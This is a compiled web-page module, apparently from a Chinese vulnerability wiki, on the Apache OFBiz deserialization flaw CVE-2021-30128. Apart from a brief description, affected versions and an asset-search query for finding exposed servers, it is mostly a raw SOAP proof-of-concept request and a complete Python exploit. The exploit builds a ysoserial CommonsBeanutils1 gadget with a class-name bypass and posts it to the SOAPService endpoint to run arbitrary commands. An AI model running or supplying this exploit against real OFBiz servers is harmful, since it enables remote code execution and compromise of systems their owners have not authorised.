import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o,c as i,a as n,b as s,d as t,e as l}from"./app-58e4a7d6.js";const c={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"Ofbiz（Open for business）是一个开源的，基于 J2EE 和 XML 规范的，用于构建大型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类 WEB 应用系统的框架（Framework）。",-1),d=n("p",null,"参考链接：",-1),k={href:"https://mp.weixin.qq.com/s/Dr-jwiRr4NByjErjiX_e1w",target:"_blank",rel:"noopener noreferrer"},v={href:"https://mp.weixin.qq.com/s/ZBrWK3qsLwQs0v6dDi2_2A",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/r0ckysec/CVE-2021-30128",target:"_blank",rel:"noopener noreferrer"},b={href:"https://mp.weixin.qq.com/s/ZBrWK3qsLwQs0v6dDi2_2A",target:"_blank",rel:"noopener noreferrer"},_=l(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache OFBiz &lt; 17.12.07
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Apache_OFBiz&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /webtools/control/SOAPService HTTP/1.1
Host: 192.168.80.145:8443
User-Agent: python-requests/2.24.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: text/xml
Content-Length: 6093


&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ser=&quot;http://ofbiz.apache.org/service/&quot;&gt;  
  &lt;soapenv:Header/&gt;  
  &lt;soapenv:Body&gt;
    &lt;ser&gt;
      &lt;map-Map&gt;
        &lt;map-Entry&gt;
          &lt;map-Key&gt; &lt;cus-obj&gt;ACED0005 ... ... 871007E000D78&lt;/cus-obj&gt;
          &lt;/map-Key&gt;  
          &lt;map-Value&gt;  
            &lt;std-String/&gt;
          &lt;/map-Value&gt;
        &lt;/map-Entry&gt;
      &lt;/map-Map&gt;
    &lt;/ser&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>exp:</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token triple-quoted-string string">&quot;&quot;&quot;
@Author: r0cky
@Time: 2021/3/24-15:09
&quot;&quot;&quot;</span>
<span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> sys

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> urllib3
urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">banner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">&quot;&quot;&quot;
===================================================
   ____  ______ ____  _       ________   _______  
  / __ \\|  ____|  _ \\(_)     |  ____\\ \\ / /  __ \\ 
 | |  | | |__  | |_) |_ ____ | |__   \\ V /| |__) |
 | |  | |  __| |  _ &lt;| |_  / |  __|   &gt; &lt; |  ___/ 
 | |__| | |    | |_) | |/ /  | |____ / . \\| |     
  \\____/|_|    |____/|_/___| |______/_/ \\_\\_|     
                                                  
    CVE-2021-30128             Powered by r0cky
===================================================
    &quot;&quot;&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">bypass</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    className <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;org.apache.commons.beanutils.BeanComparator&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;org.apache.commons.collections.comparators.ComparableComparator&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#39;</span><span class="token punctuation">]</span>

    <span class="token keyword">for</span> cn <span class="token keyword">in</span>  className<span class="token punctuation">:</span>
        len_hex <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;0x&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
        className_hex <span class="token operator">=</span> cn<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>

        bypass_className <span class="token operator">=</span> cn <span class="token operator">+</span> <span class="token string">&#39;&lt;java&#39;</span> <span class="token operator">+</span> cn<span class="token punctuation">[</span>cn<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">&#39;.&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        bypass_len_hex <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>bypass_className<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;0x&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
        bypass_className_hex <span class="token operator">=</span> bypass_className<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>

        payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>len_hex <span class="token operator">+</span> className_hex<span class="token punctuation">,</span> bypass_len_hex <span class="token operator">+</span> bypass_className_hex<span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    popen <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#39;java&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-jar&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;ysoserial.jar&#39;</span><span class="token punctuation">,</span> <span class="token string">&quot;CommonsBeanutils1&quot;</span><span class="token punctuation">,</span> cmd<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>
    payload <span class="token operator">=</span> popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;请在当前脚本目录放置ysoserial.jar!&quot;</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
    post_data <span class="token operator">=</span> bypass<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Payload:&quot;</span><span class="token punctuation">,</span> post_data<span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ser=&quot;http://ofbiz.apache.org/service/&quot;&gt;  
  &lt;soapenv:Header/&gt;  
  &lt;soapenv:Body&gt;
    &lt;ser&gt;
      &lt;map-Map&gt;
        &lt;map-Entry&gt;
          &lt;map-Key&gt;
            &lt;cus-obj&gt;{}&lt;/cus-obj&gt;
          &lt;/map-Key&gt;  
          &lt;map-Value&gt;  
            &lt;std-String/&gt;
          &lt;/map-Value&gt;
        &lt;/map-Entry&gt;
      &lt;/map-Map&gt;
    &lt;/ser&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
    &quot;&quot;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] payload sending...&quot;</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] send payload success.&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[END] Apache OFBiz RCE Done.&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] send payload failed.&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[END] Apache OFBiz RCE failed.&quot;</span><span class="token punctuation">)</span>

headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;text/xml&quot;</span><span class="token punctuation">}</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    banner<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        target <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        cmd <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
        <span class="token comment"># target = &quot;https://192.168.80.136:8443&quot;</span>
        <span class="token comment"># vps_ip = &quot;10.20.28.16&quot;</span>
        <span class="token comment"># vps_port = &quot;9999&quot;</span>
        url <span class="token operator">=</span> <span class="token string">&quot;{}/webtools/control/SOAPService&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
        exp<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Example: \\n\\tpython3 &quot;</span> <span class="token operator">+</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">&quot; &lt;target&gt; &lt;cmd&gt;\\n&quot;</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,9);function g(h,y){const a=p("ExternalLinkIcon");return o(),i("div",null,[u,r,d,n("ul",null,[n("li",null,[s("阿里云分析："),n("a",k,[s("https://mp.weixin.qq.com/s/Dr-jwiRr4NByjErjiX_e1w"),t(a)])]),n("li",null,[s("r0cky："),n("a",v,[s("https://mp.weixin.qq.com/s/ZBrWK3qsLwQs0v6dDi2_2A"),t(a)])]),n("li",null,[n("a",m,[s("https://github.com/r0ckysec/CVE-2021-30128"),t(a)])]),n("li",null,[n("a",b,[s("https://mp.weixin.qq.com/s/ZBrWK3qsLwQs0v6dDi2_2A"),t(a)])])]),_])}const w=e(c,[["render",g],["__file","Apache OFBiz 反序列化 CVE-2021-30128.html.vue"]]);export{w as default};
